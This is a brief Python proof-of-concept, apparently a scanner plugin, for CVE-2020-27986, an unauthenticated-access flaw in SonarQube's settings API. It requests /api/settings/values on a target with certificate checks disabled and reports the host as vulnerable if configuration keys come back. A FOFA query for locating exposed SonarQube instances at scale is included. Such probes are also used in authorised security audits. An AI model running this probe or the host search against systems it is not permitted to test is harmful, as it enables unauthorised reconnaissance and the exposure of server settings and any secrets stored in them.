#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecurePlatformWarning


# 脚本信息
######################################################
NAME='CVE_2020_27986'
AUTHOR="Faith"
REMARK='SonarQube API 未授权访问漏洞'
FOFA_RULE='app="sonarQube-代码管理"'
######################################################

def poc(target):
    result = {}
    url = target + "/api/settings/values"
    headers = {"UserAgent":ua}
    try:
        requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)
        r = requests.get(url=url,headers=headers,verify=False,timeout=3)
        if "key" in r.text and r.status_code ==200:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = url
            return result
        else:
            pass
    except :
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
